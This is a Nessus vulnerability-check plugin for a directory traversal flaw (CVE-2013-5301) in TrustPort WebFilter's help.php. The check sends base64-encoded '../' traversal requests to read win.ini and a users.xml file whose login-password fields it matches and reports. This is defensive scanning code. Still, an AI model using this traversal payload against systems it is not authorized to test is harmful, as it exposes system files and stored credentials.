#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(69321);
  script_version("$Revision: 1.6 $");
  script_cvs_date("$Date: 2017/02/10 22:03:56 $");

  script_cve_id("CVE-2013-5301");
  script_bugtraq_id(61662);
  script_osvdb_id(96030);
  script_xref(name:"EDB-ID", value:"27432");

  script_name(english:"TrustPort WebFilter help.php hf Parameter Directory Traversal");
  script_summary(english:"Tries to read a local file");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a PHP script that can be abused to
disclose the contents of arbitrary files.");
  script_set_attribute(attribute:"description", value:
"The TrustPort WebFilter administration console install listening on
this port fails to sanitize user input to the 'hf' parameter of the
'help.php' script before using it to return the contents of a file.

An unauthenticated, remote attacker can leverage this issue to view
arbitrary files on the remote host.");
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/527826/30/0/threaded");
  script_set_attribute(attribute:"solution", value:"Upgrade to TrustPort WebFilter 6.0.0.3033 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/08/07");
  script_set_attribute(attribute:"patch_publication_date", value:"2013/07/30");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/08/13");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:trustport:webfilter");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2017 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_require_keys("www/PHP");
  script_require_ports("Services/www", 4849);

  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("webapp_func.inc");


port = get_http_port(default:4849, php:TRUE);


# Unless we're paranoid, make sure the web server looks like
# TrustPort WebFilter's admin console.
if (report_paranoia < 2)
{
  res = http_get_cache(port:port, item:"/", exit_on_fail:TRUE);
  if (
    "http://www.trustport" >!< res &&
    "<title>TrustPort Net Gateway</title>" >!< res
  ) audit(AUDIT_WEB_APP_NOT_INST, 'TrustPort WebFilter', port);
}


files = make_list(
  'windows/win.ini',
  'winnt/win.ini',
  '../databases/users.xml'
);
file_pats = make_array();
file_pats['windows/win.ini'] = "\[[a-zA-Z]+\]|^; for 16-bit app support";
file_pats['winnt/win.ini']   = "\[[a-zA-Z]+\]|^; for 16-bit app support";
file_pats['../databases/users.xml'] = "<LOGINPASS>[^ <]+</LOGINPASS>";

foreach file (files)
{
  if ("../" >< file) hf = file;
  else hf = mult_str(str:"../", nb:12) + file;

  url = "/help.php?hf=" + base64(str:hf);
  res = http_send_recv3(port:port, method:"GET", item:url, exit_on_fail:TRUE);

  if (
    '<body onload="this.focus();">' >< res[2] &&
    egrep(pattern:file_pats[file], string:res[2])
  )
  {
    if (report_verbosity > 0)
    {
      report =
        '\n' + "Nessus was able to obtain the contents of '" + file + "' with the" +
        '\n' + 'following request :' +
        '\n' +
        '\n  ' + build_url(qs:url, port:port) +
        '\n';

      if (report_verbosity > 1)
      {
        contents = strstr(res[2], "<div>") - "<div>";
        contents = contents - strstr(contents, "</div");
        contents = ereg_replace(pattern:"^[ \t\r\n]*", replace:"", string:contents);
        if (!egrep(pattern:file_pats[file], string:contents)) contents = res[2];

        if (
          !defined_func("nasl_level") ||
          nasl_level() < 5200 ||
          COMMAND_LINE ||
          !isnull(get_preference("sc_version"))
        )
        {
          report +=
            '\n' + 'Here are the contents :' +
            '\n' +
            '\n' + crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) +
            '\n' + chomp(contents) +
            '\n' + crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';
          security_warning(port:port, extra:report);
        }
        else
        {
          if ("/" >< file) file = ereg_replace(pattern:"^.+/([^/]+)$", replace:"\1", string:file);

          report += '\n' + 'Attached is a copy of the file.' + '\n';
          attachments = make_list();
          attachments[0] = make_array();
          attachments[0]["type"] = "text/plain";
          attachments[0]["name"] = file;
          attachments[0]["value"] = chomp(contents);
          security_report_with_attachments(
            port  : port,
            level : 2,
            extra : report,
            attachments : attachments
          );
        }
      }
      else security_warning(port:port, extra:report);
    }
    else security_warning(port);
    exit(0);
  }
}
audit(AUDIT_WEB_APP_NOT_AFFECTED, "TrustPort WebFilter", build_url(qs:'/', port:port));
